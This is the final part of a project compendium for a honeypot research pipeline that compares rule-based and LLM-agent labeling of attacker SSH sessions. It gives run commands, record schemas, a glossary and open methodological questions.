# 9. Annotate: open scripts/annotate/index.html, load
#    annotation_out/annotation_sample_blind.jsonl, export when done.

# 10. Score both pipelines against ground truth
python scripts/compute_ground_truth_metrics.py \
    --annotations annotation_results_jake.jsonl \
    --sample-full annotation_out/annotation_sample_full.jsonl \
    --output ground_truth_metrics.json
```

### 14.4 Error recovery

```bash
# Extract errored sessions (null hunter verdict) from the master file — then:
python scripts/retry_errored_sessions.py retry \
    -i src/errored_sessions.jsonl -o src/retried.jsonl --concurrency 20

# Analyst-only reparse for parse failures
python scripts/retry_errored_sessions.py reanalyze \
    -i src/parse_failed.jsonl -o src/reparsed.jsonl --concurrency 20

# Merge back — ⚠ writes a NEW file; do not mv over the original without a backup
python scripts/retry_errored_sessions.py merge \
    --original src/labeled_sessions.jsonl \
    --retried  src/retried.jsonl \
    -o         src/labeled_sessions_v2.jsonl
```

### 14.5 Operational lessons already paid for

- **Always tmux.** Every long job. Name it; write the name in the run log.
- **Check free disk before any merge.** A merge needs a second full copy — 38 GB
  free minimum for the master file.
- **Verify `GOOGLE_CLOUD_PROJECT` is uncommented** before an agent run, or you
  silently fall back to AI Studio's free tier and throughput collapses ~50×.
- **Verify the ADC quota project** (`gcloud auth application-default
  set-quota-project`) matches the Vertex project.
- **Concurrency 50 OOMs on the 27k retry set.** Use 20 until §13.11 is fixed.
- **Never trust a "succeeded" count from an LLM stage.** Spot-check the actual
  parsed field values — that is how the `max_tokens` bug was found, and the only
  way it *could* have been found.

---

## 15. Schema appendices

### 15.1 Flat `ExportedSession` — the master record

The shape of every line in `src/labeled_sessions.jsonl`.

```jsonc
{
  "session_id": "57bca222",
  "location": "ssh-amsterdam",
  "start_ts": "2020-04-18T15:57:41.123456+00:00",
  "end_ts":   "2020-04-18T15:58:02.987654+00:00",
  "duration_s": 21.86,

  "src_ip": "203.0.113.44",
  "src_port": 54321,
  "dst_port": 22,
  "protocol": "ssh",                       // "telnet" iff dst_port == 23

  "auth_success": true,
  "login_attempts": [{"username": "pi", "password": "raspberry", "success": true}],
  "final_username": "pi",
  "final_password": "raspberry",

  "commands": [                            // LIST, not a dict
    {"timestamp": "2020-04-18 15:57:43.852372+00:00",
     "input": "uname -a", "success": true}
  ],
  "downloads": [{"url": "...", "shasum": "...", "outfile": "..."}],
  "uploads":   [{"shasum": "...", "destfile": "..."}],

  "ssh_version": "SSH-2.0-libssh-0.6.3",   // top level, NOT under "client"
  "hassh": "0df0d56bb50c6b2426d8d40234bf1826",

  "features": { "F1_keyword_bash": 0, /* … ~80 keys, no geo … */ },

  "labels_rule_based": {                    // PIPELINE A
    "level": 3,
    "primary_tactic": "No Action",
    "all_tactics": ["No Action"],
    "matched_patterns": [],                 // capped at 20
    "behavior_tag": "UNKNOWN_SPEED",
    "kill_chain_detected": false,
    "obfuscation_detected": false,
    "sophistication_score": 1,
    "tactic_count": 1,
    "has_download": false,
    "has_upload": true
  },

  "geo": { /* F47…F52 + extras, empty unless GeoLite2 configured */ },

  "session_type": "success_no_commands",
  "event_count": 7,
  "ingested_at": "2026-03-01T02:14:33.001Z",

  // added by add_anomaly_flag()
  "statistical_anomaly": {
    "is_anomaly": true,
    "score": 4.812,
    "reasons": ["F46_download_count=1 (high, z=4.8)"],
    "z_scores": {"F44_duration": 0.31, "...": 0.0}
  },

  // added by AgentRunner  (PIPELINE B)
  "labels_agentic": {
    "was_anomaly": true,
    "hunter_verdict": "RELEVANT",           // or "NOISE", or null on failure
    "analyst_verdict": {
      "level": 2,
      "primary_tactic": "Initial Access",
      "all_tactics": ["Initial Access", "Command and Control"],
      "technique_ids": ["T1078.003", "T1105"],
      "sophistication": "SCRIPT_KIDDIE",
      "intent": "Establish a foothold and deploy a payload",
      "reasoning": "An attacker successfully logged in using default SSH …",
      "confidence": 0.9,
      "iocs": []
    },
    "pipeline_metrics": {
      "sent_to_hunter": true,
      "sent_to_analyst": true,
      "total_latency_ms": 7412,
      "total_cost_usd": 0.0
    }
  },

  // added by index_to_elastic.py
  "label_comparison": {
    "tactics_agree": false,
    "levels_agree": false,
    "rule_level": 3,
    "agent_level": 2,
    "level_difference": 1
  }
}
```

### 15.2 Nested `Session.to_dict()` — the ES-path record

```jsonc
{
  "session_id": "...", "location": "...",
  "connection":     {"src_ip", "src_port", "dst_ip", "dst_port", "protocol"},
  "timing":         {"start_ts", "end_ts", "duration_s"},
  "client":         {"ssh_version", "hassh", "hassh_algorithms"},
  "authentication": {"attempts", "success", "failed_count", "success_count",
                     "usernames_tried", "final_username", "final_password"},
  "commands":       {"total_count", "success_count", "failed_count",
                     "inputs" /* ≤100 */, "unique_commands"},
  "downloads":      {"count", "urls" /* ≤20 */, "shasums" /* ≤20 */},
  "uploads":        {"count"},
  "tcpip_forwards": {"count"},
  "meta":           {"event_count", "source_files", "is_closed", "session_type"}
}
```

`cli.py::build_session_document` adds `features` (message + host + **geo**),
a flattened `geo` block with friendly key names, and `labels_rule_based`
(with an extra `session_type` key).

### 15.3 Annotation records

**Blind** (what annotators see) — `_extract_common_fields` + `annotation_id`,
`bucket`, `bucket_key`. No pipeline labels of any kind.

**Full** (answer key) — the blind record plus `rule_based_label`, `agent_label`,
`hunter_verdict`, `statistical_anomaly`.

**Result** (what annotators produce):

```json
{"annotation_id": 42, "annotator": "jake",
 "primary_tactic": "Command and Control", "threat_level": 2,
 "confidence": 4, "is_false_negative_risk": true, "notes": "..."}
```

### 15.4 Anomaly stats artifact

```json
{"z_threshold": 3.0, "min_samples": 100, "trained": true,
 "features": {"F44_duration": {"count": 11711491, "mean": 12.7,
                               "m2": 4.2e9, "std_dev": 18.9}, "...": {}}}
```

Only `count`, `mean`, `m2` are restored on load — `std_dev` is derived and
stored for human inspection.

---

## 16. Glossary

| Term | Meaning |
|---|---|
| **Cowrie** | Medium-interaction SSH/Telnet honeypot; logs JSON events and returns fabricated command responses |
| **Session** | All events from one attacker connection, grouped by Cowrie's `session` field |
| **Sensor / location** | One honeypot deployment (e.g. `ssh-amsterdam`) |
| **Pipeline A** | Rule-based labeler; `labels_rule_based` |
| **Pipeline B** | Anomaly gate → Hunter → Analyst; `labels_agentic` |
| **Pipeline C** | Planned classical-ML labeler; `label_ml` |
| **Pipeline E** | Planned majority-vote ensemble of B variants |
| **Hunter** | LLM triage agent; RELEVANT vs NOISE |
| **Analyst** | LLM classification agent; MITRE + reasoning + IOCs |
| **HASSH** | Hash of SSH client key-exchange parameters; a client fingerprint |
| **Welford's algorithm** | Numerically stable single-pass running mean/variance |
| **Novel finding** | Zero rule pattern matches **and** agent level ≤ 2 |
| **Dual-labeled** | A session with both a rule label and a usable analyst verdict (8,514 of them) |
| **Kill chain** | A multi-tactic combination that forces Pipeline A to level 1 |
| **MACHINE_SPEED / HUMAN_SPEED** | Behavior tag from command timing (min gap <0.05 s ⇒ machine) |
| **Blind sample** | Annotation records with pipeline labels stripped |
| **FN-risk flag** | Annotator judgment that missing this session would be dangerous |
| **Cohen's kappa** | Chance-corrected agreement; weighted (linear) for ordinal levels |
| **McNemar's test** | Paired significance test on discordant correctness pairs |
| **Non-inferiority** | Claim that B is no worse than A by more than a pre-specified margin δ |
| **Pareto frontier** | Set of pipelines not dominated on both cost and quality |
| **ECE / Brier score** | Calibration metrics for confidence-emitting models |

---

## 17. Open questions and decisions pending

These are genuine forks where the answer changes the work, not TODOs.

1. **Label-space normalization.** Do `No Action` (A) and `Initial Access` (B)
   describe the same fact? If yes, a normalization map moves the headline
   agreement number from 41.5% substantially upward and removes ~69% of tactic
   disagreements. Applying it makes the comparison fairer; not applying it makes
   the vocabulary mismatch itself the finding. **Decide once, apply
   consistently, and report the number both ways.**

2. **How to score out-of-enum tactics.** `Ingress Tool Transfer` ×141: map to
   Command and Control, or score as an error? This measurably changes Pipeline
   B's accuracy.

3. **Is the LLM reference annotation usable as ground truth?** Using Claude
   Sonnet 4 to grade an LLM pipeline is circular unless LLM-vs-human agreement
   is measured first. The human pass must therefore cover enough of the same 345
   sessions to compute that kappa before any headline rests on the LLM labels.

4. **Do the 8,514 dual-labeled sessions represent anything?** They are the
   survivors of a z-score gate *and* an LLM triage stage — a doubly-selected
   subpopulation. Accuracy measured on them does not generalize to the corpus,
   and the paper must say so. Estimating the gate's own false-negative rate
   would require labeling sessions the gate *rejected*, which nothing currently
   plans to do. **This may be the most important methodological gap.**

5. **Is a level-2-free Pipeline A a fair baseline?** With 62 L2 sessions in
   11.7M, Pipeline A's severity output is effectively binary. Reporting an
   "Pipeline A+" ablation (min-level replaced by a weighted or most-frequent
   rule, and downloads/uploads consulted on command-less sessions) would make
   the comparison much harder to dismiss as a straw man — while leaving the
   frozen baseline untouched.

6. **Data release.** Raw usernames and passwords are stored throughout. Hash,
   drop, or retain? This gates `data/README.md` in Phase 7.

7. **Re-index before or after fixing document IDs?** The annotation plan
   sequences the ES re-index first. Doing it before fixing §13.4 silently
   discards colliding sessions. Fix first.

8. **Backup strategy before the next long run.** There is currently no backup of
   the only copy of a 38 GB dataset that cost ~96 hours of model latency to
   produce. Snapshot before Phase 3 touches anything.

---

*End of compendium. If you change the code, change this document in the same
commit — its value is entirely in being current.*
